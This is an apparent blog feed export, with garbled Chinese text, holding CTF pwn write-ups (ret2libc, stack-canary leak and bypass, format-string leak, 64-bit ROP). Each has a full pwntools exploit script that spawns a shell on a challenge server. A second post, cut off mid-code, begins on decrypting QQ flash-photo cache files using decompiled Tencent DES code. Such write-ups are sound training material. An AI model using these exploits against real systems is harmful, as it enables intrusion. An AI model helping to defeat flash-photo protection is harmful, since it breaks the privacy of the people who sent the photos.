        <content type="html"><![CDATA[<h1 id="pwn03"><a href="#pwn03" class="headerlink" title="pwn03"></a>pwn03</h1><p>å°†é™„ä»¶æ‹–è¿›IDAä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠsystemå‡½æ•°ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨<img src="https://i.loli.net/2021/10/16/SdbDYyzAl3TumcV.png" alt="image.png"></p><p>æ‰€ä»¥å‡½æ•°åœ°å€æ³„éœ²è·å¾—libcç‰ˆæœ¬æ¥è·å¾—systemå‡½æ•°åœ°å€ä»è€Œè·å¾—shellã€‚å…·ä½“æ­¥éª¤ï¼š</p><ul><li>æ³„éœ² putsåœ°å€</li><li>è·å– libc ç‰ˆæœ¬</li><li>è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€</li><li>å†æ¬¡æ‰§è¡Œæºç¨‹åº</li><li>è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28015</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]       <span class="comment"># è·å–putsçš„plt</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]           <span class="comment"># è·å–putsçš„got</span></span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]          <span class="comment"># è·å–ç¨‹åºå¼€å§‹åœ°å€</span></span><br><span class="line">payload1 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>,puts_plt,start_addr,puts_got])         <span class="comment"># æ³„éœ²putsçš„gotåœ°å€</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)         <span class="comment"># è¿™é‡Œè€½è¯¯äº†å¥½ä¹…ï¼Œå› ä¸ºè¦è¯»å–æ‰ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œä¸ç„¶åé¢è·å–åœ°å€å°±ä¼šå‡ºé”™</span></span><br><span class="line">libc_puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])          <span class="comment"># æ¥æ”¶æ³„éœ²çš„åœ°å€</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)        <span class="comment"># æ‰¾åˆ°å¯¹åº”çš„libc</span></span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)         <span class="comment"># è®¡ç®—åŸºåœ°å€</span></span><br><span class="line">sys_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)         <span class="comment"># ç®—å‡ºsystemå‡½æ•°çš„åœ°å€</span></span><br><span class="line">bin_sh = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>,sys_addr,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn04"><a href="#pwn04" class="headerlink" title="pwn04"></a>pwn04</h1><p>ç”¨idaæ‰“å¼€å‘ç°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºå¹¶ä¸”è¿˜å­˜åœ¨åé—¨å‡½æ•°<img src="https://i.loli.net/2021/10/16/YkhGbwR5uyam1Np.png" alt="å±å¹•æˆªå›¾ 2021-10-16 181459.png"></p><p><img src="https://i.loli.net/2021/10/16/odXSjLRgc1mpGra.png" alt="å±å¹•æˆªå›¾ 2021-10-16 181732.png"></p><p>checksecæŸ¥çœ‹å‘ç°å­˜åœ¨canaryä¿æŠ¤ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯ç»•è¿‡canaryä¿æŠ¤è¿›å…¥åé—¨å‡½æ•°ä»è€Œè·å–shell</p><p>é€šè¿‡IDAæŸ¥çœ‹å¯ä»¥å‘ç°canaryåœ¨ebp-cçš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€è½®è¾“å…¥æ¥æ³„éœ²canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>,payload1)</span><br><span class="line">a = p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>å› ä¸ºå­˜åœ¨å›æ˜¾æ‰€ä»¥è¦å°†å›æ˜¾æ¥æ”¶ä¸ç„¶canaryå°±ä¼šå‡ºé”™ï¼Œå·²ç»è¸©å‘</strong></p><p><img src="https://i.loli.net/2021/10/16/Wof2tuehQjwRYgx.png" alt="å±å¹•æˆªå›¾ 2021-10-16 182347.png"></p><p>è·å–äº†canaryæ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡canaryè¿›å…¥åé—¨å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>,canary,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,get_shell])</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p><strong>å› ä¸ºcanaryæ˜¯å››ä¸ªå­—èŠ‚ï¼Œè€Œåˆ°è¿”å›åœ°å€è¿˜éœ€è¦0x70-0x64-4=8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦è¡¥å……8ä¸ªå­—èŠ‚</strong></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28132</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ex2&#x27;)</span></span><br><span class="line">get_shell = <span class="number">0x80485AF</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>,payload1)</span><br><span class="line">a = p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>,canary,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,get_shell])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><p>ä¹Ÿæ˜¯é€šè¿‡printfæ³„éœ²ï¼Œä¸è¿‡æ˜¯é€šè¿‡è®¡ç®—canaryåˆ°printfçš„åç§»æ¥æ³„éœ²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./ex&quot;)</span></span><br><span class="line">p =remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28097</span>)</span><br><span class="line">p.recv()</span><br><span class="line">leak_canary = <span class="string">&quot;%31$x&quot;</span></span><br><span class="line">p.sendline(leak_canary)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line">print(<span class="built_in">hex</span>(canary))</span><br><span class="line">getshell = <span class="string">b&quot;a&quot;</span> * <span class="number">100</span> + p32(canary) + <span class="string">b&quot;b&quot;</span> * <span class="number">12</span> + p32(<span class="number">0x0804859B</span>)</span><br><span class="line">p.sendline(getshell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn07"><a href="#pwn07" class="headerlink" title="pwn07"></a>pwn07</h1><p>æ‰“å¼€å‘ç°æ˜¯64ä½ç¨‹åºï¼Œåˆ†æä¸€ä¸‹å‘ç°pwn03åšæ³•ç›¸åŒï¼Œæ³„éœ²å‡½æ•°åœ°å€ä»è€Œè·å–libcç‰ˆæœ¬æ‰¾åˆ°systemå‡½æ•°è¿›è€Œè·å–shellã€‚åœ¨æŸäº›ç»†èŠ‚ä¸Šè¿˜æ˜¯æœ‰ç‚¹ä¸åŒï¼Œ32ä½æ˜¯é€šè¿‡æ ˆä¼ é€’å‚æ•°ï¼Œè€Œ64ä½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°(å½“å‚æ•°å°äº7ä¸ªæ—¶ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨rdi,rsi,rdx,rcx,r8,r9)ï¼Œæ‰€ä»¥æ‰§è¡Œsystem(â€œbin/shâ€)æ—¶rdiå¯„å­˜å™¨è¦å­˜å‚¨çš„æ˜¯bin/shå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š</p><p>æ³„éœ²putså‡½æ•°éœ€è¦å…ˆå°†putsçš„gotè¡¨åœ°å€ä¼ é€’åˆ°rdiå¯„å­˜å™¨ä¸­åœ¨è·³è½¬åˆ°putså‡½æ•°è¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œsystemå‡½æ•°æ—¶ä¸ä»…è¦è®°ä½é€šè¿‡rdiä¼ å‚è¿˜è¦æ³¨æ„å †æ ˆå¯¹é½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure><p>p64(ret_addr)ç›®çš„ç”¨äºå †æ ˆå¯¹é½ï¼Œä¸ç„¶åé¢ä¼šæŠ¥é”™ã€‚</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28138</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x04006e3</span></span><br><span class="line">ret_addr = <span class="number">0x0004006E4</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">libc_puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQé—ªç…§ç ´è§£ï¼ˆå¾…å®Œç»“ï¼‰</title>
      <link href="/post/QQ%E9%97%AA%E7%85%A7.html"/>
      <url>/post/QQ%E9%97%AA%E7%85%A7.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>å’Œæœ‹å‹èŠå¤©æ—¶çªå‘å¥‡æƒ³ï¼Œæƒ³å°è¯•ä¸€ä¸‹è·å–é—ªç…§æºæ–‡ä»¶ï¼Œå¿™äº†ä¸€ä¸ªä¸‹åˆè¿˜æ˜¯æ²¡æœ‰è§£å†³ï¼ˆä¸»è¦æ˜¯å¤ªèœäº† /(ã„’oã„’)/~~ ï¼‰</p></blockquote><h1 id="åŸç†å’Œæ€è·¯"><a href="#åŸç†å’Œæ€è·¯" class="headerlink" title="åŸç†å’Œæ€è·¯"></a>åŸç†å’Œæ€è·¯</h1><p>é—ªç…§è²Œä¼¼æ˜¯ä¸€ç§æœ¨é©¬æ”¹ç¼–è€Œæ¥ï¼Œä½†æ˜¯å› ä¸ºå®ç”¨æ€§ä¸é«˜å¯èƒ½å°±è¢«è®¾è®¡æˆé—ªç…§äº†ï¼ˆç›²çŒœï¼‰ã€‚é—ªç…§çš„å·¥ä½œåŸç†å¤§æ¦‚æ˜¯æœ‰ä¸€ä¸ªFLAG_SECUREçª—å£ï¼Œå¦‚æœå¯ç”¨äº†FLAG_SECUREï¼Œé‚£ä¹ˆå°†ä¸å…è®¸ç”¨æˆ·åœ¨æ­¤ç•Œé¢æˆªå›¾/å½•å±ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å…è®¸æˆªå›¾è¿™ä¸ªåŠŸèƒ½æ˜¯Androidç³»ç»Ÿæä¾›ç»™å¼€å‘è€…çš„ã€‚å½“æ—¶é—´ä¸€è¿‡ï¼Œç¨‹åºå°±ä¼šè‡ªåŠ¨å°†é—ªç…§åˆ é™¤ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­æœ‰ä¸ªå¾ˆå¤§çš„å¼Šç«¯ï¼Œå°±æ˜¯åœ¨ç…§ç‰‡è¿˜æœªè¯»å–æ—¶ï¼Œç…§ç‰‡ä¼šå­˜åœ¨äºç¼“å­˜ä¹‹ä¸­ï¼Œå¾ˆå®¹æ˜“è¢«æå–å‡ºæ¥æŸ¥çœ‹ã€‚<img src="https://i.loli.net/2021/10/13/94hWsJ3cOzAQvUk.jpg" alt="v2-490e56ae39fb40e269e4b0076e8fcf43_r.jpg"></p><p>æ‰€ä»¥åœ¨2021å¹´ä»¥å‰çš„qqï¼Œé—ªç…§åŸºæœ¬ä¸Šå’Œæ™®é€šç…§ç‰‡æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œåªè¦åœ¨ç¼“å­˜ä¸­æå–åˆ°å°±å¯ä»¥ä¿å­˜èµ·æ¥ã€‚ä½†æ˜¯ç°åœ¨å·²ç»è¢«ä¿®å¤äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†æ•™ç¨‹å·²ç»å¤±æ•ˆäº†ã€‚ï¼ˆå¯èƒ½æŸäº›å¤§ä½¬è‡ªå·±ç ´è§£äº†ï¼Œåªæ˜¯æˆ‘ä¸çŸ¥é“ï¼‰ã€‚ç°åœ¨çš„é—ªç…§åœ¨ç¼“å­˜ä¸­æå–åˆ°æ”¹åç¼€å·²ç»æ²¡æœ‰ç”¨äº†ï¼Œå› ä¸ºç°åœ¨çš„ç…§ç‰‡å·²ç»è¢«åŠ å¯†äº†ï¼ˆæ–‡ä»¶å¤´å°±å†™ç€åŠ å¯†äºŒå­—ğŸ˜’ï¼‰</p><p>æ¥ä¸‹æ¥å°±æ˜¯è®²è®²æˆ‘è‡ªå·±çš„æ€è·¯ï¼š</p><p>1ã€é¦–å…ˆæ‰¾åˆ°ç¼“å†²åŒºæ–‡ä»¶ï¼Œè·¯å¾„ï¼ˆAndriod/data/com.tecent.mobileqq/Tencent/MobileQQ/chatpic/chatimgï¼‰ï¼Œé‡Œé¢çš„ä¸œè¥¿åº”è¯¥å’Œä¸‹é¢å·®ä¸å¤šï¼ˆå¦‚æœæ‰¾ä¸åˆ°å¯èƒ½æ˜¯æ²¡æœ‰æ‰“å¼€æ˜¾ç¤ºéšè—æ–‡ä»¶ã€‚ï¼‰ï¼Œä¹‹åæŒ‰ç…§æ—¶é—´é¡ºåºæ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶ã€‚<img src="https://i.loli.net/2021/10/13/bcLsOGxe7SrHBPq.jpg" alt="QQå›¾ç‰‡20211013192450.jpg"></p><p>å½“åˆæ‰¾åˆ°ä»¥åé«˜å…´äº†è€åŠå¤©ï¼Œç»“æœæ‰“å¼€å‘ç°è¢«åŠ å¯†äº†ï¼Œæ°”çš„æƒ³æ‰“äººã€‚åé¢çœ‹åˆ°ä¸€ä¸ªå¤§ä½¬è®²è§£ï¼Œå‘ç°æ˜¯desåŠ å¯†ï¼ˆå°±çŸ¥é“è…¾è®¯ä¸ä¼šå‹¤å¿«åˆ°è‡ªå·±å†™å‡ºç®—æ³•ï¼‰ä»–é€šè¿‡TIM2.1.0çš„apkåç¼–è¯‘äº†ä¸€ä¸‹ï¼Œå‘ç°com.tencent.mobileqq.utils.DESUtilä¸­æœ‰å‡ ä¸ªå‡½æ•°å¯ä»¥åŠ è§£å¯†é—ªç…§å›¾ç‰‡ï¼Œå‘ç°ä½¿ç”¨çš„æ˜¯javax.cryptoåŠ è§£å¯†ã€‚</p><p>è¿™ä¸ªç±»å¤§æ¦‚å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼Œå…¶ä¸­byte[]å‚æ•°æ˜¯åŠ è§£å¯†çš„key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_123.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> com.tencent.mobileqq.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tencent.mobileqq.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.tencent.qphone.base.util.QLog;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.CipherInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.CipherOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DESUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(File var0, File var1_6, <span class="keyword">byte</span>[] var2_8)</span> </span>&#123;</span><br><span class="line"><span class="comment">//åŠ å¯†</span></span><br><span class="line">        var6_15 = <span class="keyword">new</span> SecretKeySpec(DESUtil.a((<span class="keyword">byte</span>[])var2_8), <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var2_8 = Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var2_8.init(<span class="number">1</span>, (Key)var6_15);</span><br><span class="line">        var6_15 = <span class="keyword">new</span> FileInputStream((File)var0);</span><br><span class="line">        var0 = <span class="keyword">new</span> FileOutputStream((File)var1_6);</span><br><span class="line">        var1_6 = <span class="keyword">new</span> CipherInputStream((InputStream)var6_15, (Cipher)var2_8);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2_8 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            var0.write(<span class="string">&quot;ENCRYPT:&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));<span class="comment">//å†™æ–‡ä»¶å¤´</span></span><br><span class="line">            <span class="keyword">while</span> ((var3_16 = var1_6.read((<span class="keyword">byte</span>[])var2_8)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                var0.write((<span class="keyword">byte</span>[])var2_8, <span class="number">0</span>, var3_16);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception var4_11) &#123;</span><br><span class="line"><span class="comment">//ç•¥</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span 